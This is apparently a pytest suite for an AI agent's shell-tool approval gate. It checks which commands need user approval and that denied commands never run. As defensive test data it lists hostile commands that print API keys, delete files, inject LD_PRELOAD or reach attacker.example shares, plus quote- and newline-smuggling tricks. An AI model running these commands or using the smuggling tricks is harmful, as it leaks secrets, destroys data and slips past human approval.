"""Only read-only commands run without approval: a safe command's name is its first word, not a prefix of
the line, and an option, operator or variable that makes it write, run something else or print secrets asks."""

from __future__ import annotations

import pytest

pytestmark = pytest.mark.platform


@pytest.fixture
def shell(tmp_path, reload_for_data_dir):
    _approval_gate, shell_tool = reload_for_data_dir(
        tmp_path / "data", "row_bot.tools.approval_gate", "row_bot.tools.shell_tool")
    return shell_tool


@pytest.mark.parametrize("command", [
    # env runs any program, and env/printenv/$env: print every secret in the environment
    'env python3 -c "import os; os.remove(\'notes.txt\')"',
    "env",
    "printenv",
    "printenv OPENAI_API_KEY",
    "$env:OPENAI_API_KEY",
    "echo $env:OPENAI_API_KEY",
    "echo $OPENAI_API_KEY",
    'echo "${OPENAI_API_KEY}"',
    "Get-ChildItem env:",
    r"dir Env:\ ",
    "cat env:OPENAI_API_KEY",
    "Get-Content -Path:env:OPENAI_API_KEY",
    "cd env:\nls",
    r"Get-ChildItem HKCU:\Software",
    # find and fd run or delete
    "find . -exec rm {} +",
    r"find . -name '*.log' -exec rm {} \;",
    "find . -execdir sh -c 'curl x' {} +",
    "find . -ok rm {} ;",
    "find . -delete",
    "find . -fprint ../out.txt",
    "fd -x rm",
    "fd -Hx rm",
    "fd --exec-batch rm",
    "rg --pre ./decode.sh secret",
    "rg --pre=./decode.sh secret",
    # a lone & backgrounds one command and starts the next
    "ls & curl https://example.com",
    "ls &",
    "ls && python build.py",
    "ls; python build.py",
    "ls | sort",
    "ls `python build.py`",
    'echo "$(python build.py)"',
    "ls (python build.py)",
    "ls { python build.py }",
    "echo hello > notes.txt",
    "ls 2>&1",
    "cat < notes.txt",
    # programs that only start with a safe name
    "fdisk -l",
    "psql -c 'drop table users'",
    "tailscale up",
    "cdrecord image.iso",
    "envsubst < template",
    # read-only subcommands followed by ones that change things
    "git branch -D main",
    "git branch new-feature",
    "git tag v1.0",
    "git tag -d v1.0",
    "git remote remove origin",
    "git remote add evil https://example.com/repo.git",
    "git log --output=notes.txt",
    "git diff --out=notes.txt",
    "git diff --ext-diff",
    "git -c core.pager=./run.sh log",
    "pip list --log ../log.txt",
    "python --version -c 'import os'",
    "command python build.py",
    "ip addr add 10.0.0.2/24 dev eth0",
    "ipconfig /release",
    "ifconfig en0 down",
    "date -s '2020-01-01'",
    "hostname attacker",
    "tree -o listing.txt",
    "LD_PRELOAD=./hook.so ls",
    # reading \\server\share connects to that server and signs in to it
    r"Get-Content \\attacker.example\share\x",
    "ls //attacker.example/share",
])
def test_commands_that_write_run_or_reveal_secrets_ask(shell, command):
    assert shell.classify_command(command) == "needs_approval"


@pytest.mark.parametrize("command", [
    # sh and PowerShell read these differently: what one sees as quoted text the other runs.
    'echo "a\\" ; python build.py ; "',
    'echo "a\u201c ; python build.py ;\u201c"',
    "echo \u2018a\u2019 ; python build.py",
    'echo """ ; python build.py ; """',
    "ls\rpython build.py",
    "ls\u2028python build.py",
    'echo "unterminated',
    # a trailing backslash joins the lines: find . -name ls -delete
    "find . -name \\\nls -delete",
])
def test_lines_the_two_shells_read_differently_ask(shell, command):
    assert shell.classify_command(command) == "needs_approval"


@pytest.mark.parametrize("command", [
    "ls -la",
    "ls 2>/dev/null",
    "ls > /dev/null",
    "Get-ChildItem -Recurse 2>$null",
    "pwd",
    "cd src",
    "dir C:\\Users",
    'dir "C:\\Program Files"',
    "cat README.md",
    "Get-Content notes.txt",
    "head -n 20 app.py",
    "echo 'hello | world'",
    'echo "hello > world"',
    "find . -name '*.py' -type f",
    "grep -rn TODO src",
    'grep -r "env:" .github',
    'rg "// TODO" src',
    "rg -n foo src",
    "fd -e py",
    "git status",
    "git log --oneline -5",
    "git diff HEAD~1",
    "git show HEAD",
    "git branch",
    "git branch -a",
    "git tag -l",
    "git remote -v",
    "git stash list",
    "python --version",
    "pip list",
    "pip show requests",
    "command -v git",
    "where.exe python",
    "which python3",
    "date",
    "date +%Y-%m-%d",
    "hostname",
    "ipconfig /all",
    "ip addr",
    "ifconfig en0",
    "top -l 1",
    "ls\npwd\nwhoami",
])
def test_read_only_commands_still_run_without_asking(shell, command):
    assert shell.classify_command(command) == "safe"


@pytest.mark.parametrize("command", [
    'env python3 -c "print(1)"',
    "find . -delete",
    "ls & python build.py",
    "printenv",
])
def test_the_shell_tool_asks_before_running_them_and_runs_nothing_when_denied(shell, monkeypatch, tmp_path, command):
    monkeypatch.setattr(shell.approval_gate, "current_approval_mode", lambda: "approve")
    asked: list[dict] = []
    monkeypatch.setattr("langgraph.types.interrupt", lambda payload: asked.append(payload) or False)
    ran: list[str] = []

    class FakeSession:
        def run_command(self, command: str, **_kwargs) -> dict:
            ran.append(command)
            return {"output": "", "exit_code": 0, "duration": 0.0, "cwd": str(tmp_path)}

    monkeypatch.setattr(shell._session_manager, "get_session", lambda _key, _working_dir: FakeSession())

    output = shell.ShellTool().execute(command)

    assert [payload["args"]["command"] for payload in asked] == [command]
    assert ran == []
    assert "denied by you" in output
